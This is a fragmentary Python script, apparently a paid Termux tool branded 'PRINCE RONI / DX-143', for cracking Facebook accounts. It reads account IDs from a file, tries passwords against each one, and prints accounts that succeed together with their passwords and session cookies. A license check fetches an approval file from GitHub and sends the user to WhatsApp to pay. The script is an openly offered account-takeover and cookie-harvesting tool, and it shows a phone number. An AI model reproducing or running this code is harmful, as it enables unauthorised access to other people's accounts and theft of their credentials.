...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'PRINCE' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  prince roni,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mPRINCE RONI ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • PRINCE RONI ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mDX-143 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01916564949 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/dx.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[DX-143] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#DX-143
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•DX-Cp] {idf} • {pw}')     
				...
				#DX-143
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•DX143-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Dx,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/DX-143/Paid/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m PRINCE RONI, ToOLs Daily Update")
		...
		os.system('am start https://wa.me/+8801916564949?text=' + tks)
		Subscraption() 
Subscraption() 
login()